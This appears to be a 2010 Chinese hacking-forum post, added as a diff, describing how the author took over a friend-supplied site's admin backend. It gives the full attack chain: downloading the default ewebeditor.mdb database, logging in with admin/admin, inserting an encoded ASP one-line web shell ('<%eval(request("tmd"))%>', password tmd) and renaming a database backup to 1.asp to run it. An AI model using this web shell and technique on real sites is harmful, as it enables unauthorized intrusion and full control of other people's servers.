@@ -1,0 +1,33 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+后台巧妙拿webshell
+D8888D主贴内容-------------------------------------------------------
+ 
+
+
+作者:wjs qq825680101
+     菜菜可以恶补下
+
+朋友发了个后台让帮忙拿shell，图1
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/10031721090dd8b625a1c3c993.jpg[/img]
+[url=http://www.t00ls.net/attachment.php?aid=NDIzNnw1MGNiYWIwZXwxMjg2NDgyMDY1fGViMmFqajJvKzQwWDkxczBQUmRHL1NPb0xqeEUvTVRHZnJvSVV3UUJLQUVWV2Jr&nothumb=yes]链接标记下载[/url] (24.82 KB)
+
+2010-3-17 21:09现看了上传有ewebeditor编辑器，默认数据库db/ewebeditor.mdb能下载。管理员名字和密码都是admin，但是后台找不到也没找人前人入侵过的痕迹，不然可以修改样式上传。
+看到数据库备份，备份文件不能修改，备份名字可以修改。图2
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/10031721094752cd52f845f3b9.jpg[/img]
+[url=http://www.t00ls.net/attachment.php?aid=NDIzOHxlMzk4YTlhMnwxMjg2NDgyMDY1fGViMmFqajJvKzQwWDkxczBQUmRHL1NPb0xqeEUvTVRHZnJvSVV3UUJLQUVWV2Jr&nothumb=yes]链接标记下载[/url] (32.32 KB)
+
+2010-3-17 21:09之前入侵过这样的后台，拿shell方法是在管理员那插入一句,话图3
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/1003172109805b2c5952825620.jpg[/img]
+[url=http://www.t00ls.net/attachment.php?aid=NDIzNXxjOTcxNTgyNHwxMjg2NDgyMDY1fGViMmFqajJvKzQwWDkxczBQUmRHL1NPb0xqeEUvTVRHZnJvSVV3UUJLQUVWV2Jr&nothumb=yes]链接标记下载[/url] (24.61 KB)
+
+2010-3-17 21:09一句话是编码过的┼癥污爠煥敵瑳∨浴≤┩>
+<%eval(request("tmd"))%>
+密码 tmd
+然后数据库备份1.asp,右键属性就看到数据库路径。
+用一句话连接。图4
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1003/1003172109c62e052d7f10a159.jpg[/img]
+[url=http://www.t00ls.net/attachment.php?aid=NDIzN3wzYjA2ZDdlZnwxMjg2NDgyMDY1fGViMmFqajJvKzQwWDkxczBQUmRHL1NPb0xqeEUvTVRHZnJvSVV3UUJLQUVWV2Jr&nothumb=yes]链接标记下载[/url] (13.22 KB)
+
+2010-3-17 21:09结束
